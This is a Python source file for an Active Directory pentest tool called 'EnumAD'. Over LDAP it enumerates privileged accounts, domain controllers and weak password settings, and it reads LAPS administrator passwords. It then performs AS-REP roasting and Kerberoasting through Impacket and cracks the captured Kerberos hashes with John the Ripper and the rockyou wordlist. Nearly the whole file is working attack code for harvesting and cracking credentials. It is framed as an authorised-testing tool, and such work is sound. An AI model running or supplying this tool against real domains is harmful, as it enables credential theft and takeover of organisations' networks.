#from logging import error
import ldap
from ldap import VERSION3 
from pwn import log 
import subprocess
import argparse
import datetime, time
import re
import math
import socket
from shutil import which
from os import path

GetNPUsers = 'GetNPUsers.py'
GetUserSPNs = 'GetUserSPNs.py'

# Style
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class LoginError:
    NO_ERROR            = 0
    INVALID_CREDENTIALS = 1
    SERVER_DOWN         = 2
    OTHER_ERROR         = 3

def highlightGreen(msg:str)->str:
    return bcolors.OKGREEN + msg + bcolors.ENDC
def highlightRed(msg:str)->str:
    return bcolors.FAIL + msg + bcolors.ENDC
def highlightWARNING(msg:str)->str:
    return bcolors.WARNING + msg + bcolors.ENDC
def StyleBold(msg:str)->str:
    return bcolors.BOLD + msg + bcolors.ENDC

def LdapPathColor(data:str)->str:
    strColor = data.replace("CN=", StyleBold("CN") +"=").replace("OU=", StyleBold("OU")+"=").replace("DC=", StyleBold("DC")+"=")
    return strColor

def printTitle(msg:str)->None:
    print("\n" + bcolors.BOLD + msg + bcolors.ENDC)

def CreateSpace(var_string:str,nbSpace = 25)->str:
    return (nbSpace - int(math.fmod(len(var_string),nbSpace))) * ' '

def ResolveIpAddress(domain_name:str)->str:
    try:
        data = socket.gethostbyname_ex(domain_name)
        ipAddres = data[2][0]
    except Exception:
        log.warning("Fail to resolve ServerName: " +domain_name)
        return None
    return ipAddres

def append_to_file(filename:str,date:str) -> bool:
    try:
        with open(filename, "a+") as file:
            file.write(date + "\n")
    except PermissionError as ErrorMsg:
        log.failure("Fail to append to file: "+str(ErrorMsg)+" !\n")
        return False
    except:
        log.failure("Fail to append to file: '"+filename+ "' !\n")
        return False
    return True

class LdapEnum:
    def __init__(self, BASE_DN:str)->None:
        self.baseDn = BASE_DN
        self.ldapVersion = VERSION3

    def __BannerLDAP(self)->None:
        print("\n====================================================")
        print("===================== Enum LDAP ====================")
        print("====================================================\n\n")
        
    def __SearchServerLdap(self,OBJECT_TO_SEARCH:str, ATTRIBUTES_TO_SEARCH:str)->list:
        resultSearch = []

        try:
            result = self.ldapCon.search_s(self.baseDn, ldap.SCOPE_SUBTREE , OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH) 
            for info in result:
                if(info[0] != None):
                    resultSearch.append([info[0],info[1]])
            if(len(resultSearch) == 0):
                log.warning("No entry found !")
        except ldap.OPERATIONS_ERROR as error:
            log.failure("OPERATIONS_ERROR: "+ str(error))
            exit(0)
        except ldap.LDAPError as error:
            log.failure("LDAPError: " + str(error))
            exit(0)

        return resultSearch

    # Unix timestamp to the AD one
    def __datetime_to_mstimestamp(self, dt:datetime)->int:
        timestamp = int(dt.timestamp())
        magic_number = 116_444_736_000_000_000
        shift = 10_000_000
        return (timestamp*shift) + magic_number

    def SearchServerLdapUser(self,OBJECT_TO_SEARCH:str)->list:
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName']
        resultSearch = []

        try:
            result = self.ldapCon.search_s(self.baseDn, ldap.SCOPE_SUBTREE, OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH) 
            for info in result:
                if(info[0] != None):
                    baseName = info[0]
                    username = info[1]["sAMAccountName"][0].decode()
                    if(username != "krbtgt"):
                        resultSearch.append([baseName,username])
            if(len(resultSearch) == 0):
                log.warning("No entry found !")
        except ldap.OPERATIONS_ERROR as error:
            log.failure("OPERATIONS_ERROR: "+ str(error))
            exit(0)
        except ldap.LDAPError as error:
            log.failure("LDAPError: " + str(error))
            exit(0)
        return resultSearch

    def LoginLdap(self,connect, username:str, password:str , first_time:bool)->int:
        try:
            if(username == None and password == None):
                connect.simple_bind_s('', '')
            else:
                if(password == None):
                    password == ''
                connect.simple_bind_s(username, password)            
        except ldap.INVALID_CREDENTIALS:
            if(not first_time):
                log.failure('Invalid credentials !\n')
            return LoginError.INVALID_CREDENTIALS
        except ldap.SERVER_DOWN:
            log.failure("Server is down !\n\n")
            return LoginError.SERVER_DOWN
            #exit(0)
        except ldap.LDAPError as error:
            if type(error.message) == dict and error.message.has_key('desc'):
                log.failure("Other LDAP error: " + error.message['desc']+ " !\n")
            else: 
                log.failure("Other LDAP error: " + error+ " !\n")
                self.ldapCon = None
            return LoginError.OTHER
        return LoginError.NO_ERROR

    def ConnectServerLdap(self,domain_name:str,ip_address:str, username:str, password:str, is_SSL:bool)->None:
        log.info("Domain name:\t"+domain_name)
        if(username == None):
            log.info("Username:\t   "+StyleBold("Anonymous"))
        else:
            log.info("Username:\t   "+username)
        if(ip_address == None):
            ip_address = ResolveIpAddress(domain_name)
            if(ip_address == None):
                log.failure("Unable to resolve domain name:  "+domain_name+ " !\n")
                exit(0)

        log.info("IP Address:\t "+ip_address)
        if(is_SSL):
            ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
            connect = ldap.initialize('ldaps://' + ip_address)
            connect.start_tls_s()
            log.info("SSL connect:\t"+highlightGreen("TRUE"))
            # TODO:
            # con.get_option(ldap.OPT_X_TLS_CIPHER)
            # con.get_option(ldap.OPT_X_TLS_CIPHER_SUITE)
            # con.get_option(ldap.OPT_X_TLS_PROTOCOL_MIN) # -> 0x303 for TLS 1.2 / 0x304 for TLS 1.3
            # con.get_option(ldap.OPT_X_TLS_VERSION)
        else:
            connect = ldap.initialize('ldap://' + ip_address)
            if(connect.get_option(ldap.OPT_X_TLS_DEMAND)):
                log.info("SSL supported:  "+highlightGreen("TRUE"))
            else:
                log.warning("SSL supported:  "+highlightRed("FALSE"))
                
            log.warn("SSL connect:\t"+highlightRed("FALSE"))
        print()

        connect.protocol_version = self.ldapVersion
        connect.set_option(ldap.OPT_REFERRALS, 0)
        
        is_auth = self.LoginLdap(connect, username, password,True)
        if(is_auth == LoginError.INVALID_CREDENTIALS):
            if(self.LoginLdap(connect, username+'@'+domain_name, password,False) != LoginError.NO_ERROR):
                exit(0)
        elif(is_auth is not LoginError.NO_ERROR):
            exit(0)

        log.success("Succesfully Authenticated With LDAP")
        self.ldapCon = connect
        return
    
    def GetAuthMech(self):
        printTitle("[-] Authentication mechanism")
        OBJECT_TO_SEARCH = '(objectclass=*)'
        ATTRIBUTES_TO_SEARCH = ['supportedSASLMechanisms']
        
        result = self.ldapCon.search_s("",ldap.SCOPE_BASE,OBJECT_TO_SEARCH,ATTRIBUTES_TO_SEARCH)
        list_auth_mec = result[0][1]['supportedSASLMechanisms']
        for auth_mec in list_auth_mec:
            auth_mec = auth_mec.decode('utf-8')
            
            
            if(auth_mec == "DIGEST-MD5"):
                log.warning(StyleBold(StyleBold(auth_mec)+"\t\t\t\t\t\t ")+highlightWARNING("Consider as weak security protocols"))
                log.failure(StyleBold("LOGIN")+"\t\t\t\t\t\t\t  "+highlightRed("Plaintext password"))
                log.failure(StyleBold("PLAIN")+"\t\t\t\t\t\t\t  "+highlightRed("Plaintext password"))
            elif(auth_mec == "NTLM"):
                log.warning(StyleBold(auth_mec)+"\t\t\t\t\t\t\t   "+highlightWARNING("Consider as weak security protocols"))
            elif(auth_mec == "CRAM-MD5"):
                log.warning(StyleBold(auth_mec)+"\t\t\t\t\t\t\t   "+highlightWARNING("Consider as weak security protocols"))
            
            elif(auth_mec == "ANONYMOUS"):
                log.warning(StyleBold(auth_mec))
            
            
            # 
            elif(auth_mec == "LOGIN"):
                log.failure(StyleBold(auth_mec)+"\t\t\t\t\t\t\t  "+highlightRed("Plaintext password"))
            elif(auth_mec == "PLAIN"):
                log.failure(StyleBold(auth_mec)+"\t\t\t\t\t\t\t  "+highlightRed("Plaintext password"))
            
            
            # Uses Kerberos tickets to authenticate to the server
            elif(auth_mec == "GSSAPI"):
                log.success(auth_mec)
            elif(auth_mec == "GSS-SPNEGO"):
                log.success(auth_mec)
                
                
            # Uses the TLS certification mechanism to authenticate users.
            elif(auth_mec == "EXTERNAL"):
                log.success(auth_mec)
                
            else:
                log.info(auth_mec)  # NMAS_LOGIN,SPNEGO,OTP
                  
    def UserOldPassword(self)->None:
        printTitle("[-] Users with old password")

        password_min_age=100
        time_filter = "(pwdLastSet<=%s)"% self.__datetime_to_mstimestamp(datetime.datetime.now() - datetime.timedelta(days=password_min_age))
        OBJECT_TO_SEARCH = '(&(objectCategory=user)'+time_filter+')'
        ATTRIBUTES_TO_SEARCH = ['pwdLastSet','sAMAccountName']
        
        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            timestamp = int(info[1]['pwdLastSet'][0].decode())
            username = info[1]['sAMAccountName'][0].decode()
            if(timestamp != 0):
                value = datetime.datetime (1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000)
                now = datetime.datetime.now( )
                lastChange = now - value
                if(lastChange.days > 100):
                    log.warning("Username: "+ highlightRed(username)+CreateSpace(username)+"Password last change: " + highlightRed(str((now - value).days))+" days ago "+ value.strftime('%Y-%m-%d %H:%M:%S'))
   
    def GetUserAndDescription(self)->None:
        printTitle("[-] Users with an interesting description")

        OBJECT_TO_SEARCH = '(&(objectCategory=user)(|(description=*pwd*)(description=*password*)))'
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName','description']

        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]['sAMAccountName'][0].decode()
            description = info[1]['description'][0].decode()
            log.info("Username: "+highlightRed(username)+CreateSpace(username)+description)

    def GetDomainAdmin(self)->None:
        printTitle("[-] Users who are Domain Admin")

        OBJECT_TO_SEARCH = '(&(objectCategory=user)(adminCount=1))'

        result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
        for info in result:
            base_name = info[0]
            username = info[1]
            log.info("Username: "+highlightRed(username)+CreateSpace(username)+LdapPathColor(base_name))

    def GetDomainControllers(self)->None:
        printTitle("[-] Domain Controllers")

        OBJECT_TO_SEARCH = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
        ATTRIBUTES_TO_SEARCH = ["sAMAccountName","operatingSystem","operatingSystemVersion"]

        result = self.__SearchServerLdap(OBJECT_TO_SEARCH,ATTRIBUTES_TO_SEARCH)
        for info in result:
            baseName = info[0]
            ComputerName = info[1]["sAMAccountName"][0].decode()
            ComputerOsName = info[1]["operatingSystem"][0].decode()
            ComputerOsVersion = info[1]["operatingSystemVersion"][0].decode()
            log.info("Computer: "+highlightRed(ComputerName)+CreateSpace(ComputerName)+LdapPathColor(baseName))
            print("\t[V]",ComputerOsName, ComputerOsVersion)

    def PasswordNotExpire(self)->None:
        printTitle("[-] Users with Password Not Expire")

        OBJECT_TO_SEARCH = '(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'

        result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
        for info in result:
            baseName = info[0]
            username = info[1]
            log.info("Username: "+highlightRed(username)+CreateSpace(username)+LdapPathColor(baseName))


    '''
    The list `list_default_object` might need to be update
    Might need to check if return value is None
    '''
    def DetectNotDefaultAttributes(self)->None:
        printTitle("[-] Not Default Attributes (TEST IN BETA)\n")

        list_default_object = [
            "accountExpires",
            "badPasswordTime",
            "badPwdCount",
            "c",
            "cn",
            "codePage",
            "company",
            "countryCode",
            "description",
            "displayName",
            "distinguishedName",
            "dn",
            "dSCorePropagationData",
            "instanceType",
            "l",
            "lastLogoff",
            "lastLogon",
            "logonCount",
            "memberOf",
            "name",
            "objectCategory",
            "objectClass",
            "objectGUID",
            "objectSid",
            "postalCode",
            "primaryGroupID",
            "pwdLastSet",
            "sAMAccountName",
            "sAMAccountType",
            "st",
            "streetAddress",
            "userAccountControl",
            "userPrincipalName",
            "uSNChanged",
            "uSNCreated",
            "whenChanged",
            "givenName",
            "mail",
            "sn",
            "lastLogonTimestamp",
            "adminCount",
            "showInAdvancedViewOnly",
            "logonHours",
            "isCriticalSystemObject",
            "msDS-SupportedEncryptionTypes",
            "servicePrincipalName",
            "whenCreated"
        ]
        
        OBJECT_TO_SEARCH = '(objectcategory=user)'
        ATTRIBUTES_TO_SEARCH = ["*"]
        
        nb_detection = 0
        result = self.__SearchServerLdap(OBJECT_TO_SEARCH,ATTRIBUTES_TO_SEARCH)
        for info in result:
            for list_current_object in info[1]:
                if(list_current_object not in list_default_object):
                    for info_encode in info[1][list_current_object]:
                        if(info_encode.isascii()):
                            object_value = info_encode.decode()
                        else:
                            object_value = ascii(info_encode)
                        log.warning(f"{info[0]:45s}->\t{StyleBold(list_current_object)}: {object_value}\n\n")
                        nb_detection += 1
        if(nb_detection == 0):
            log.warning("No entry found !")
    def UserDefEncrypt(self)->None:
        printTitle("[-] Users with not the default encryption")

        OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(msDS-SupportedEncryptionTypes=*))'
        ATTRIBUTES_TO_SEARCH = ['msDS-SupportedEncryptionTypes', 'sAMAccountName']

        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]['sAMAccountName'][0].decode()
            algoType = info[1]['msDS-SupportedEncryptionTypes'][0].decode()
            if(algoType == "0"):
                algoType = "Password is in a reversible encryption or in DES !"
            elif(algoType == "1"):
                algoType = "Password is stored in " + highlightRed("CRC32")
            elif(algoType == "2"):
                algoType = "Password is stored in " + highlightRed("RSA-MD5")
            elif(algoType == "4"):
                algoType = "Password is stored in " + highlightRed("RC4-HMAC-MD5")
            elif(algoType == "8"):
                algoType = "Password is stored in HMAC-SHA1-96-AES128"
            elif(algoType == "16"):
                algoType = "Password is stored in HMAC-SHA1-96-AES256"
            else: 
                 algoType = "Password is stored in "+str(algoType)+" encryption"
            log.info("Username: "+highlightRed(username)+CreateSpace(username)+algoType)
        return
        
    def UserNoDelegation(self)->None:
        printTitle("[-] Protecting Privileged Domain Accounts")

        OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))'

        result = self.SearchServerLdapUser(OBJECT_TO_SEARCH)
        for info in result:
            baseName = info[0]
            username = info[1]
            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
    def GetLapsPassword(self)->None:
        printTitle("[-] Laps Password")

        OBJECT_TO_SEARCH = '(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))'
        ATTRIBUTES_TO_SEARCH = ['ms-Mcs-AdmPwd','SAMAccountname']

        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            computer_name = info[1]['sAMAccountName'][0].decode()
            admin_passwd = info[1]['ms-Mcs-AdmPwd'][0].decode()
            log.info("Computer: " + highlightRed(computer_name) + CreateSpace(computer_name) + 'Password: '+highlightRed(admin_passwd))
    def Disconnect(self)->None:
        self.ldapCon.unbind() 

    def StartEnum(self)->None:
        self.GetAuthMech()
        
        self.__BannerLDAP()
        self.GetDomainAdmin()
        self.GetDomainControllers()
        self.PasswordNotExpire()
        self.UserOldPassword()
        self.GetUserAndDescription()
        self.UserDefEncrypt()
        self.UserNoDelegation()
        self.DetectNotDefaultAttributes()
        self.GetLapsPassword()

class KerbExploit:
    
    def __init__(self,ldapEnum, domainName,johnPath,wordlistPath,ipAddress=None)->None:
        self.ldapEnum = ldapEnum
        self.domain_name = domainName
        self.wordlistPath = wordlistPath
        self.ipAddress = ipAddress
        self.johnPath = johnPath
    
    def __BannerAttack(self)->None:
        print("\n\n====================================================")
        print("==================== Attack AD =====================")
        print("====================================================\n")

    def __strip_Domain_name(self,username:str)->str:
        new_username = username.split("\\")
        if(len(new_username) == 2):
            return new_username[1]
        return username

    def __RunImpacket(self,argProcess:list)->list:
        if(self.ipAddress != None):
            argProcess.append("-dc-ip")
            argProcess.append(self.ipAddress)
        process =  subprocess.run(argProcess, check=True, stdout=subprocess.PIPE)
        return process.stdout.decode().splitlines()

    def RunJohn(self,fileName:str, algoType:str)-> bool:
        isSuccess = False

        if('krb5asrep' in algoType):
            regexHashUser = r"(.*[^\s-])\s+\(\$krb5\w+\$23\$(\w+-?\w+)@.+\.\w+\)"
        elif('krb5tgs' in algoType):
            regexHashUser = r"(.*[^\s-])\s+\(\?\)"
        else:
            log.warning('Fail to detect hash !')
            return isSuccess

        progress = log.progress("Cracking hash from file: " + highlightRed(fileName))
        process =  subprocess.run((self.johnPath, fileName,algoType, "--wordlist=" + self.wordlistPath), check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) 

        
        output = process.stdout.decode()
        for output in output.splitlines():
            x = re.search(regexHashUser, output)
            if(x is not None):
                if('krb5asrep' in algoType):
                    print("",end='\t')
                    log.success("Credential Found: '" + highlightGreen(x.group(2))+":"+ highlightGreen(x.group(1))+"'")
                    isSuccess = True
                elif('krb5tgs' in algoType):
                    print("",end='\t')
                    log.success("Credential Found: '" + highlightGreen(x.group(1))+"'")
                    isSuccess = True
                else:
                    log.warning('Fail get hash !')
            elif("$krb5asrep" in output):
                data = output.split()
                if(data[0] is not None and data[1] is not None):
                    log.success("Credential Found: '" + highlightGreen(data[0])+"' for '"+ highlightGreen(data[1])+"'")
        progress.success(status='Done')
        return isSuccess
    def __ExploitASREP(self, username:str, output_file:str)-> bool:
        isSuccess = False
        argProcess = [GetNPUsers,self.domain_name+"/"+username,"-no-pass"]
        output = self.__RunImpacket(argProcess)
        for line in output:
            kerbHash = line.split('$')
            if(len(kerbHash) > 1 and kerbHash[1] == "krb5asrep" and kerbHash[2] == "23"): 
                if(append_to_file(output_file,line)):
                    isSuccess = True
        return isSuccess
    def __ExploitKerberoasting(self, targetUser:str, username:str, password:str, TargetService:str, output_file:str) -> bool:
        is_success = False
        if(username == None or password == None):
            argProcess = [GetUserSPNs,self.domain_name+"/","-request-user",TargetService,"-no-pass"]
        else:
            new_username = self.__strip_Domain_name(username)
            argProcess = [GetUserSPNs,self.domain_name+"/"+new_username+':'+password,"-request-user",TargetService]
        output = self.__RunImpacket(argProcess)
        for line in output:
            kerbHash = line.split('$')
            if(len(kerbHash) > 1 and kerbHash[1] == "krb5tgs" and kerbHash[2] == "23"):
                if(append_to_file(output_file,line)):
                    is_success = True
        return is_success

    def ASREP_Roastable_LDAP(self, output_file:str = "ASREPHash.hash")-> bool:
        printTitle("[-] AS-REP Roastable Users")

        is_success = False
        OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
        result = self.ldapEnum.SearchServerLdapUser(OBJECT_TO_SEARCH)

        for info in result:
            baseName = info[0]
            username = info[1]
            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
            is_success = self.__ExploitASREP(username, output_file)
        if(is_success):
            log.success("Hash added to file:                " + output_file)
        return is_success
    def ASREP_Roastable_SMB(self, output_file:str = "ASREPHash.hash")-> bool:
        is_success = False

        arg_process = [GetNPUsers,self.domain_name+"/","-outputfile" , output_file, "-format", "john"]
        output_tab = self.__RunImpacket(arg_process)
        for output in output_tab:
            if(output != '' and "Copyright" not in output):
                log.success(f"{output}")
                is_success = True
        return is_success

    def Kerberoastable(self,username:str, password:str, output_file = "kerbHash.hash") -> dict:
        printTitle("[-] Kerberoastable Users")

        is_success = False
        OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
        
        result = self.ldapEnum.SearchServerLdapUser(OBJECT_TO_SEARCH)
        
        for info in result:
            base_name = info[0]
            target_username = info[1]
            log.info("Username: " + highlightRed(target_username) + CreateSpace(target_username) + LdapPathColor(base_name))
            is_success = self.__ExploitKerberoasting(target_username,username, password,target_username, output_file)
        if(is_success):
            log.success("Hash added to file:                " + output_file)
        return is_success
    def DefaultConfig(self, ouput_file:str, format_hash:str) -> dict:
        configDefault = {
            'ouputFile' : ouput_file,
            'formatHash' : format_hash,
            'isHashFound' : False
        }
        return configDefault
    def StartKerbExploit(self,user_config: dict) -> None:
        self.__BannerAttack()

        config_ASREP = self.DefaultConfig('ASREPHash.hash','--format=krb5asrep')
        config_file_kerb = self.DefaultConfig('kerbHash.hash','--format=krb5tgs')

        config_ASREP['isHashFound'] = self.ASREP_Roastable_LDAP(config_ASREP['ouputFile'])
        if(user_config['NPUsersCheck']):
            config_ASREP['isHashFound'] = self.ASREP_Roastable_SMB()
        
        config_file_kerb['isHashFound'] = self.Kerberoastable(user_config['username'], user_config['password'],config_file_kerb['ouputFile'])


        if((config_ASREP['isHashFound'] or config_file_kerb['isHashFound']) and user_config['baseDN']):
            printTitle("[-] Starting to crack hashs")
            is_result = False
            if(config_ASREP['isHashFound'] and user_config['isCrackingEnable']):
                self.RunJohn(config_ASREP['ouputFile'], config_ASREP['formatHash'])
                is_result = True
            if(config_file_kerb['isHashFound'] and user_config['isCrackingEnable']):
                self.RunJohn(config_file_kerb['ouputFile'], config_file_kerb['formatHash'])
                is_result = True
            if(not is_result):
                log.warning("No entry found !")

def ManageArg() -> dict:
    parser = argparse.ArgumentParser(description='Pentest tool that detect misconfig in AD with LDAP', usage='%(prog)s -d [domain] -u [username] -p [password]')
    parser.version = 'EnumAD version: 0.1.2-Dev'

    parser.add_argument('-d',  metavar=' [domain]', type=str, help='The name of domain (e.g. "test.local")', required=True)
    parser.add_argument('-u',  metavar=' [username]', type=str,help='The user name', default=None)
    parser.add_argument('-p',  metavar=' [password]', type=str,help='The user password', default=None)
    parser.add_argument('-ip', metavar='[ipAddress]', type=str, help='The IP address of the server (e.g. "1.1.1.1")', default=None)

    parser.add_argument('-j',  help='Enable hash cracking (john)', action='store_true')
    parser.add_argument('-jp', metavar='[path]',type=str, help='John binary path', default="john")
    parser.add_argument('-w',  metavar=' [wordList]', type=str,help='The path of the wordlist to be used john (Default: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt', default="/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt")

    parser.add_argument('-v', '--version', action='version', help='Show program\'s version number and exit')
    parser.add_argument('-s', help='Use LDAP with SSL', action='store_true')
    parser.add_argument('-c', '--NPUsersCheck', help='Check with GetNPUsers.py for ASREP Roastable', action='store_true')

    try:
        args = parser.parse_args()
    except:
        exit(0)
        
    domain_cut = args.d.split('.')
    if(len(domain_cut) >= 2):
        BASE_DN = ''
        for dc in domain_cut:
            BASE_DN += 'dc=' + dc + ','
        BASE_DN = BASE_DN[:-1]
    else:
        log.warning("The domain name '"+ args.d +"' is invalid !")
        exit(0)
    user_config = {
            'domain' : args.d,
            'ipAddress' : args.ip,
            'username' : args.u,
            'password' : args.p,
            'isSSL' : args.s,
            'baseDN' : BASE_DN,
            'wordlistPath' : args.w,
            'isCrackingEnable' : args.j,
            'johnPath' : args.jp,
            'NPUsersCheck' : args.NPUsersCheck
    }
    return user_config

def CheckRequirement(user_config: dict)-> None:
    if(user_config['isCrackingEnable']):
        if(not path.exists(user_config['wordlistPath'])):
            log.warning("Wordlist '"+user_config['wordlistPath']+"' not found !")
            exit(1)
        johnPath = which(user_config['johnPath'])
        if(johnPath is None or not path.exists(johnPath)):
            log.warning("The command  '"+user_config['johnPath']+"' not found !")
            log.info("Link: https://github.com/openwall/john")
            exit(1)
    GetNPUsersPath = which('GetNPUsers.py')
    GetUserSPNsPath = which('GetUserSPNs.py')
    if(GetNPUsersPath is None or GetUserSPNsPath is None):
        GetNPUsersPath = which('impacket-GetNPUsers')
        GetUserSPNsPath = which('impacket-GetUserSPNs')
        if(GetNPUsersPath is not None and GetUserSPNsPath is not None):
            global GetNPUsers
            GetNPUsers = 'impacket-GetNPUsers'
            global GetUserSPNs
            GetUserSPNs = 'impacket-GetUserSPNs'
        else:
            log.warning("Impacket must be install to run the tool !")
            log.info("Link: https://github.com/SecureAuthCorp/impacket")
            exit(1)

            
def MainBanner() -> None:
    print("\n   █████╗ ██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗")
    print("  ██╔══██╗██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║")
    print("  ███████║██║  ██║    █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║")
    print("  ██╔══██║██║  ██║    ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║")
    print("  ██║  ██║██████╔╝    ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║")
    print("  ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝")
    print("\n")

def MainWork(user_config:dict)-> None:
    ldap_enum = LdapEnum(user_config['baseDN'])
    ldap_enum.ConnectServerLdap(user_config['domain'], user_config['ipAddress'],user_config['username'], user_config['password'], user_config['isSSL'])

    ldap_enum.StartEnum()

    kerbExploit = KerbExploit(ldap_enum,user_config['domain'],user_config['johnPath'],user_config['wordlistPath'],user_config['ipAddress'])
    kerbExploit.StartKerbExploit(user_config)

    ldap_enum.Disconnect()

if __name__ == '__main__':
    MainBanner()
    user_config = ManageArg()
    CheckRequirement(user_config)
    MainWork(user_config)
    print("")
    exit(0)
